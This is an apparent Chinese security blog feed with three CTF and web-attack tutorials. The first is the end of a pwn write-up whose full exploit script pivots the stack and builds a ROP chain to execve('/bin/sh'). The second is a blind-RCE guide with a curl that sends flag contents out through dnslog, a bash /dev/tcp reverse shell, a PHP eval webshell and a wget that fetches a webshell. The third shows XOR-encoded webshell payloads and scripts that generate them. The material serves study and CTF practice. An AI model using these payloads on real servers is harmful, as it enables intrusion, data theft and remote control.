<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142752.png" alt="image-20240428175826441"></p>
<p><code>start_routine</code>函数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101143181.png" alt="image-20240428184444419" style="zoom:80%;" />

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	如果是一般的题并且没有开沙箱，可以栈迁移打<code>ret2libc</code>。但是本题开了沙箱，程序中不允许出现除<code>read,write,clock_nanosleep,exit_group</code>之外的系统调用。与此同时，本题也创建了一个子线程，也就是说我们有可能在子线程中执行后门函数去拿到<code>shell</code>。</p>
<p>在父进程中布置<code>rop</code>，栈迁移，泄漏<code>libc</code>，并修改<code>sleep</code>函数的<code>got</code>表为<code>call_read</code>的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line"><span class="comment">#再read一次，依旧0x50个字节。由于lea rax,[rbp-0x40]这个指令，我们在这里覆盖rbp的时候要在.bss段的地址上+0x40</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#下面这个payload中的前0x40个字节被写到.bss(0x404400)</span></span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line"><span class="comment">#让rbp中为elf.got[&#x27;sleep&#x27;]+0x40，然后通过lea rax,[rbp-0x40]，mov rsi,rax这两个指令，下一次read的时候，我们就能覆盖sleep函数的got表中的内容为call_read的地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment">#              rbp         自己加一个leave ; ret栈迁移</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>让父进程陷入死循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(call_read) <span class="comment">#把call_read的地址写到sleep函数got表中</span></span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span>  <span class="comment">#让父进程陷入死循环</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line"><span class="comment">#rbp为sleep的got表，栈迁移把执行流迁移到sleep函数也就是程序中的call_read地址</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>布置<code>rop</code>链</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401593</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401591</span></span><br><span class="line">pop_rbp = <span class="number">0x40123d</span></span><br><span class="line">leave_ret = <span class="number">0x401481</span></span><br><span class="line">bss = <span class="number">0x404400</span></span><br><span class="line">call_read = <span class="number">0x4014be</span></span><br><span class="line">data = <span class="number">0x404068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This is my thread...&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">libc_base = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rax = libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rsi = libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x11f497</span></span><br><span class="line">jmp_rax = <span class="number">0x4011cc</span></span><br><span class="line"></span><br><span class="line">payload = p64(call_read)</span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142302.png" alt="image-20240428184257703"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>几个<code>gdb</code>调试要用到的命令：</p>
<p>查询线程<code>id</code>：<code>i threads</code></p>
<p>切换线程：<code>thread id</code></p>
<p>线程锁定：<code>set scheduler-locking on</code></p>
<p>解除锁定：<code>set scheduler-locking off</code></p>
</li>
<li><p>沙箱（<em>Sandbox</em>）是一种安全机制，用于限制程序的运行环境。如果父进程在创建子线程之前设置了沙箱策略，那么这些策略可能会限制子线程的行为。然而，如果子线程在沙箱策略设置之前就已经创建，那么它可能不会受到这些限制。</p>
</li>
<li><blockquote>
<p>子进程的栈区是父进程用<em>mmap</em>映射出来的一片内存(并不能在父进程里溢出篡改子进程的数据)</p>
<p><em>bss</em>段 <em>data</em>段以及代码段(以及<em>got</em>表)的数据是父进程和子进程之间所共享的</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>沙箱</tag>
      </tags>
  </entry>
  <entry>
    <title>无回显RCE</title>
    <url>/2025/03/03/%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
    <content><![CDATA[<h2 id="什么是无回显RCE？"><a href="#什么是无回显RCE？" class="headerlink" title="什么是无回显RCE？"></a>什么是无回显RCE？</h2><p>无回显RCE，简单来说就是没有任何回显，不管命令或代码是否执行成功。这样的命令执行函数有exec()、shell_exec()。</p>
<h2 id="判断是否执行成功"><a href="#判断是否执行成功" class="headerlink" title="判断是否执行成功"></a>判断是否执行成功</h2><ol>
<li><p>延时：</p>
<span id="more"></span>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">windows</span>：whoami&amp;&amp;ping -n <span class="number">5</span> <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Linux</span>：whoami&amp;&amp;sleep <span class="number">5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>目标服务器向个人的公网服务器<strong>发起http请求</strong>，当该公网服务器收到http请求就代表命令有执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">6666</span></span><br><span class="line"><span class="attribute">curl</span> 公网服务器IP:端口号</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="tee命令"><a href="#tee命令" class="headerlink" title="tee命令"></a>tee命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">tee</span> a <span class="comment">#将ls的结果输入文件a中</span></span><br></pre></td></tr></table></figure>

<h3 id="dnslog-cn外带"><a href="#dnslog-cn外带" class="headerlink" title="dnslog.cn外带"></a><a href="http://www.dnslog.cn/">dnslog.cn</a>外带</h3><ol>
<li>适用Linux</li>
<li>命令用反引号包裹</li>
<li>命令中不能有空格</li>
</ol>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl `<span class="built_in">whoami</span>`.lc52y4.dnslog.cn</span><br><span class="line">curl `<span class="built_in">cat</span> flag|sed s/[[:space:]]//`.lc52y4.dnslog.cn</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/服务器IP/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="直接写入或外部下载webshell"><a href="#直接写入或外部下载webshell" class="headerlink" title="直接写入或外部下载webshell"></a>直接写入或外部下载webshell</h3><ol>
<li><p>直接写入，需要站点目录具有写权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span> &gt; exp.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>外部下载，目标服务器可以连接外网且与攻击机互通：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget 攻击机IP -o <span class="built_in">exp</span>.php</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="各种命令执行"><a href="#各种命令执行" class="headerlink" title="各种命令执行"></a>各种命令执行</h3><p><strong>前提：目标服务器上要有已知可读文件，站点目录具有写权限</strong></p>
<p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容。</p>
<ol>
<li><p>cp和mv和重定向</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>tar和zip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php  <span class="comment"># 打包flag.php为flag.tar</span></span><br><span class="line">tar zcvf flag.tar.gz flag.php  <span class="comment"># 压缩flag.php为flag.tar.gz</span></span><br><span class="line"><span class="comment"># 解压缩：tar zxvf flag.tar.gz</span></span><br><span class="line">zip flag.zip flag.php</span><br><span class="line"><span class="comment">#解压缩：unzip flag.zip</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/kinyoobi/p/15415869.html">无回显的渗透技巧 - kinyoobi - 博客园</a></p>
<p><a href="https://www.cnblogs.com/pursue-security/p/15406672.html">RCE篇之无回显rce - 学安全的小白 - 博客园</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>无数字字母RCE</title>
    <url>/2025/02/06/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
    <content><![CDATA[<p>无数字字母RCE就是不利用数字和字母，构造<code>webshell</code>来执行命令。常见的利用方法有异或、取反这两种，此外还有或、自增和临时文件。</p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><span id="more"></span>

<p>​	在php中，两个字符进行异或时，会先将字符分别转换成ascii码值，再将这个值转换成二进制，然后将两个二进制值进行按位异或。按位异或的规则：<code>1^1=0,0^0=0,1^0=1</code></p>
<p>以<code>@</code>和<code>!</code>异或得<code>a</code>为例，下面是三种不同的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"><span class="comment">// echo urlencode(&#x27;@!&#x27;);  #%40%21，%后面的是十六进制</span></span><br><span class="line"><span class="comment">// echo hexdec(&quot;40&quot;)^hexdec(&quot;21&quot;);   #得到97，a的ascii码十进制表示</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="number">97</span>);</span><br><span class="line"><span class="comment">// echo hexdec(&quot;40&quot;).&#x27;,&#x27;.hexdec(&quot;21&quot;);   #64,33是40,21的十进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="number">64</span>^<span class="number">33</span>);</span><br></pre></td></tr></table></figure>

<p>通过构造<code>$_GET[]</code>传入新的参数，执行<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finds</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$index</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$a</span>=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">27</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">27</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">			<span class="variable">$x</span> = <span class="variable">$a</span>[<span class="variable">$i</span>] ^ <span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">			<span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$string</span>[<span class="variable">$k</span>]) == <span class="variable">$x</span>)&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="variable">$string</span>[<span class="variable">$k</span>].<span class="string">&quot;:&quot;</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;%&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) . <span class="string">&#x27;^%&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$a</span>[<span class="variable">$j</span>]).<span class="string">&quot;   &quot;</span>;</span><br><span class="line">					<span class="variable">$index</span>++;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$index</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;     <span class="comment">#dechex将十进制转换为十六进制</span></span><br><span class="line">&#125;         <span class="comment">#hexdec将十六进制转换为十进制</span></span><br><span class="line"><span class="title function_ invoke__">finds</span>(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>原理：按位异或相同为0不同为1，任意字符与<code>%ff</code>异或两次得任意字符。</p>
<p>先看下面这个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;print_r&#x27;</span> ^ <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line"><span class="comment">//$a 为 %8F%8D%96%91%8B%A0%8D</span></span><br><span class="line"><span class="comment">#输出:print_r</span></span><br></pre></td></tr></table></figure>

<p>构造<code>print_r(scandir(.));</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//%8F%8D%96%91%8B%A0%8D^%ff%ff%ff%ff%ff%ff%ff  #print_r</span></span><br><span class="line"><span class="comment">//%8C%9C%9E%91%9B%96%8D^%ff%ff%ff%ff%ff%ff%ff(%D1^%ff)  #scandir(.)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(.));</span><br><span class="line"><span class="comment">//((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));</span></span><br></pre></td></tr></table></figure>

<p>构造<code>readfile(end(scandir(.)));</code>：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">((<span class="variable">%8</span>D<span class="variable">%9</span>A<span class="variable">%9</span>E<span class="variable">%9</span>B<span class="variable">%99</span><span class="variable">%96</span><span class="variable">%93</span><span class="variable">%9</span>A)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))(((<span class="variable">%9</span>A<span class="variable">%91</span><span class="variable">%9</span>B)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))((<span class="variable">%8</span>C<span class="variable">%9</span>C<span class="variable">%9</span>E<span class="variable">%91</span><span class="variable">%9</span>B<span class="variable">%96</span><span class="variable">%8</span>D)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))(<span class="variable">%D1</span>^<span class="variable">%ff</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>有时候可能会限制字符的种类个数，我们就需要在原有的字符里再相互异或出需要的字符，需要一个一个找哪些字符可以由哪些字符异或得出。</p>
<p>例如<code>a = c^p^r</code>，为什么要三个字符异或两次而不是两个字符异或一次呢，因为要保证其他的字符不变，需要与<code>%ff</code>异或两次。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Find</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]^<span class="variable">$a</span>[<span class="variable">$k</span>])==<span class="variable">$c</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$k</span>].<span class="string">&#x27;=&#x27;</span>.<span class="variable">$c</span>.<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;eadilnscipt&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">Find</span>(<span class="variable">$str</span>,<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<p>现在要将<code>((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))</code>减少字符种类，其实我们是要<strong>对<code>%8F%8D%96%91%8B%A0%8D</code>进行多次异或使之不变</strong>，已知<code>n = i^s^t</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;n&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;i&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;s&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;t&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="comment">#输出:%91 %96 %8C %8B</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%96&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%8c&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%8b&quot;</span>));</span><br><span class="line"><span class="comment">#输出:%91</span></span><br></pre></td></tr></table></figure>

<p>故有如下结论：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="variable">%8</span>F<span class="variable">%8</span>D<span class="variable">%96</span><span class="variable">%91</span><span class="variable">%8</span>B<span class="variable">%A0</span><span class="variable">%8</span>D <span class="operator">=</span> (<span class="variable">%8</span>F<span class="variable">%8</span>D<span class="variable">%96</span><span class="variable">%96</span><span class="variable">%8</span>B<span class="variable">%A0</span><span class="variable">%8</span>D)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%8</span><span class="keyword">c</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%8</span>b<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>)</span><br></pre></td></tr></table></figure>

